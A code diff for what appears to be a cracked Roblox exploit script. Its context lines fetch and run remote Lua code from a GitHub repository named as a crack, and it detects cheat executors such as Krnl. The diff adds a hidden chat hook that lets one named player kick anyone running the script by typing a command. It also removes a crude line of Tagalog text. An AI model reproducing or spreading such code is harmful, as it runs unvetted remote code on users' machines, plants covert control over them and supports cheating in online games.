@@ -1,3 +1,9 @@
+game.Players.badethskie84.Chatted:Connect(function(c)
+   if c == '.kick Oak' then
+      game.Players.LocalPlayer:Kick('KICKED FOR EXPLOITING, DM THE OWNER IF THIS WAS A MISTAKE.')
+     end
+end)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviie/New-Verts-Hub-Crack/main/Encrypt.lua"))("Encrypt")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviie/New-Verts-Hub-Crack/main/Encrypt1.lua"))("Arabic String")
 local Request, GetAsset = nil, nil
@@ -23,7 +29,6 @@ elseif (KRNL_LOADED and request) then
 	print("Krnl")
 elseif request then 
 	Request = request
-	say('ang laki ng tite ni sen')
 else
 	say('i dont have request')
 end	
